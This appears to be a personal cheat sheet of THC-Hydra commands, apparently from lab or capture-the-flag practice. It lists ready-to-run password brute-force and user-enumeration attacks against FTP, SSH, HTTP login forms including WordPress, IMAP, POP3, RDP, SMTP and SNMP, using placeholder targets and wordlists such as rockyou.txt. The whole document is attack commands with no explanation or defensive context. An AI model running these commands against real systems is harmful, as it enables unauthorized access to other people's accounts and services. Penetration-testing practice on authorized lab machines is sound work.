# Hydra-CMD-List
Hydra Command List by me
Hydra:
=======================================
hydra -l user -P passlist.txt ftp://MACHINE_IP

 SSH : hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

Post Web Form
=============
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


Brute force SSH
=============
⇒ hydra -s 22 -v -q -L user.txt -P /usr/share/wordlists/rockyou.txt -e nsr -t 4 -w 5 10.10.10.10 ssh -V

⇒ hydra -l root -p admin 10.10.10.10 -t 4 ssh

Brute force HTTP POST Form
=======================
⇒ WordPress example:
hydra -l user1 -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&redirect_to=http%3A%2F%2F10.10.10.10%2Fwp-admin%2F&testcookie=1:F=ERROR"

⇒ hydra -l user1 -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect"

⇒ hydra -l user1 -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

Brute Force FTP
=============
⇒ hydra -l user -P passlist.txt ftp://10.10.10.10

Brute Force IMAP
==============
⇒ hydra -L userlist.txt -p defaultpw imap://10.10.10.10/PLAIN

Brute Force POP3
==============
⇒ hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5

Brute Force RDP
=============
⇒ hydra rdp://10.10.10.10/firstdomainname -l john -p doe

Brute Force SMTP
==============
hydra smtp-enum://10.10.10.10/vrfy -l john -p localhost

Brute Force SNMP
==============
⇒ hydra -L user.txt -P pass.txt -m 3:SHA:AES:READ 10.10.10.10 snmp (SNMP v3)
⇒ hydra -P pass.txt -m 2 10.10.10.10 snmp (SNMP v2)
